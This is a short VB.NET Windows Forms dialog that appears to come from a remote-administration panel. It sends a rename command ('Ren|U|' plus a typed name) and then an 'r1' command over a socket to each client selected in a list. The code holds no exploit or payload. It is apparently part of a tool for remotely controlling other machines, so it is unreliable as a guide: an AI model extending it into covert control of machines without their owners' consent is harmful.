Public Class Form18



    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If TextBox1.Text = "" Then
            AvButton1.Enabled = False
        Else
            AvButton1.Enabled = True
        End If
    End Sub

    Private Sub Form18_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub AvButton1_Click(sender As Object, e As EventArgs) Handles AvButton1.Click
        Dim name As String = TextBox1.Text

        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "Ren" & "|U|" & name)
            Form1.colord()
        Next
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "r1")
            Form1.colord()
        Next
        Me.Close()
    End Sub
End Class